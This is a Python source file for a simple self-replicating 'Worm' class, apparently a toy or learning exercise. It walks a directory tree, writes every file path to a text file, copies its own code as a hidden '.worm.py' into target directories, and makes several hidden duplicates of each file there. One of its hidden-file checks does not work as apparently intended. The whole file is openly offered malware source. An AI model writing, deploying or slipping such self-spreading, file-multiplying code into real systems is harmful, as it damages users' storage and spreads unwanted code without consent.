import os
import shutil

class Worm:
    
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if path is None:
            self.path = "/"
        else:
            self.path = path
            
        if target_dir_list is None:
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if iteration is None:
            self.iteration = 2
        else:
            self.iteration = iteration
        
        self.own_path = os.path.realpath(__file__)

    def list_files_and_directories(self, path):
        files_and_directories = []
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            if not file.startswith('.'):
                absolute_path = os.path.join(path, file)
                if os.path.isdir(absolute_path):
                    files_and_directories.append(absolute_path)
                    files_and_directories.extend(self.list_files_and_directories(absolute_path))
                else:
                    files_and_directories.append(absolute_path)
        return files_and_directories

    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            shutil.copyfile(self.own_path, destination)

    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory, f".{file}{i}")
                        shutil.copyfile(source, destination)

    def write_files_to_txt(self, file_list):
        with open('files_list.txt', 'w') as file:
            for file_path in file_list:
                file.write(file_path + '\n') 
        print(f'Todos os arquivos foram escritos em "files_list.txt".')

    def start_worm_actions(self):
        file_list = self.list_files_and_directories(self.path)
        self.write_files_to_txt(file_list) 
        print(file_list)
        
        self.create_new_worm()
        self.copy_existing_files()

if __name__ == "__main__":
    current_directory = os.path.abspath("")  
    worm = Worm(path=current_directory)  
    worm.start_worm_actions()  

    
